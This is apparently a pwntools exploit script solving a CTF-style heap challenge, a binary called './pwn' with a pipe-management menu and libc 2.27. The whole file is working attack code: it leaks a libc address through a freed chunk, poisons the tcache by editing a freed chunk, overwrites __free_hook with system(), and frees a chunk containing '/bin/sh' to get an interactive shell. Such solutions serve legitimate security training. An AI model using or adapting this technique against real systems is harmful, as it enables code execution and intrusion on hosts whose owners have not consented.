#!/usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.terminal = ['tmux', 'splitw', '-h']
context.os = 'linux'
context.arch = 'amd64'

debug = 1
if debug:
    io = process('./pwn')
else:
    io = remote('0.0.0.0',10086)

elf = ELF('./pwn')
libc = ELF('./libc-2.27.so')
one_gadgets = [0x4f2a5, 0x4f302, 0x10a2fc]

def p(script = '0'):
    if script == '0':
        gdb.attach(io)
        pause()
    else:
        gdb.attach(io, script)

leak = lambda name, address: log.success("{} --> {}".format(name, hex(address)))

def cmd(i, prompt=b"CLOSE:"):
    io.sendlineafter(prompt, i)

def add(size, name, descrip):
    cmd(b'2')
    size = int(hex(size),16)
    io.sendlineafter(b"ew pipe name? ",str(size).encode())
    io.sendafter(b"ame of the new pipe? ", name)
    io.sendafter(b"a description: ", descrip)
    io.sendlineafter(b"he data (radius,speed,length): ", b"+")

def edit(idx, choice, content):
    cmd(b'6')
    io.sendlineafter(b"ote\nChoose >",str(choice).encode())
    io.sendlineafter(b"ase choose pipe: ",str(idx).encode())
    io.sendafter(b"ese input info >", content)

def show():
    cmd(b'1')

def dele(idx):
    cmd(b'3')
    io.sendlineafter(b"ase choose pipe: ",str(idx).encode())
    io.sendlineafter(b"Please input any key to continue ..", b'')

add(0x428, b'\n', b'\n') # idx 12
pause()
dele(12)
add(1, b'a', b'a\n') # 13
add(1, b'a', b'a\n') # 14
show()
#context.log_level = 'debug'
libc.address = u64(io.recvuntil(b'\x7f')[-6:] + b'\x00'*2) - 0x3ebca0
leak("libc", libc.address)
io.sendlineafter(b"Please input any key to continue ..", b'')
dele(13)
dele(14)
target_addr = libc.symbols['__free_hook']
edit(14, 1, p64(target_addr) + b'\n')
io.sendlineafter(b"Please input any key to continue ..", b'')
add(8, b"/bin/sh\x00", 'a\n') # 15
add(8, p64(libc.sym['system']), 'a\n') 
#p()

cmd(b'3')
io.sendlineafter(b"ase choose pipe: ",str(15).encode())

# 看着复杂其实挺多漏洞的
io.interactive()
